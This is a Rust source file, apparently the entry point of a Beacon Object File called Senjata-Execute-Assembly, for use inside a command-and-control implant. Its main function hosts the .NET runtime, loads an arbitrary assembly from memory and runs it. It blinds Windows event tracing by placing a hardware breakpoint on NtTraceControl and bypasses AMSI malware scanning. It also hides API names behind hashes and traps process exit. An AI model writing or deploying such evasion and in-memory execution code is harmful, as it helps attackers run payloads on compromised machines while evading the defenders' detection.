//! Senjata-Execute-Assembly BOF — entry point.
#![no_std]

pub mod args;
#[cfg(target_os = "windows")]
pub mod cleanup;
#[cfg(target_os = "windows")]
pub mod clr;
#[cfg(target_os = "windows")]
pub mod error;
#[cfg(target_os = "windows")]
pub mod io;
pub mod pe_parser;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    #[cfg(target_os = "windows")]
    {
        match run(args, len) {
            Ok(()) => rustbof::println!("[+] senjata-execute-assembly finished"),
            Err(e) => rustbof::eprintln!("[-] {}", e.format()),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (args, len);
    }
}

#[cfg(target_os = "windows")]
fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
    use error::BofError;
    let a = args::parse(raw_args, len).map_err(BofError::Args)?;
    unsafe {
        let asm_info = pe_parser::parse(&a.asm_bytes).map_err(BofError::PeParse)?;

        let engine = opsec_hwbp::HwbpEngine::init().map_err(BofError::Hwbp)?;
        let _etw = if a.etw {
            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exp_h = opsec_strcrypt::hash!("NtTraceControl");
            let target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exp_h))
                .ok_or(BofError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exp_h,
                })?;
            Some(
                engine
                    .install_rip_ret(target as usize, 0)
                    .map_err(BofError::Hwbp)?,
            )
        } else {
            None
        };

        let host = clr::start(&asm_info)?;
        let io_ch = io::IoChannel::open(a.mailslot, &a.slot_name, &a.pipe_name)?;
        let domain = clr::create_domain(&host, &a.app_domain)?;
        let _amsi = if a.amsi {
            Some(engine.install_amsi_set().map_err(BofError::Hwbp)?)
        } else {
            None
        };

        let assembly = clr::load_assembly(&domain, &a.asm_bytes)?;

        let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
        let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
        let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
        let exit_target = opsec_peb::resolve_module(ntdll_h)
            .and_then(|m| opsec_peb::resolve_export(m, exit_h))
            .ok_or(BofError::PebResolve {
                module_hash: ntdll_h,
                export_hash: exit_h,
            })?;
        let _exit_trap = engine
            .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
            .map_err(BofError::Hwbp)?;

        clr::invoke(&assembly, &a.asm_args, a.entry_point)?;
        let output = io_ch.drain()?;
        rustbof::println!("\n{}", output);
    }
    Ok(())
}
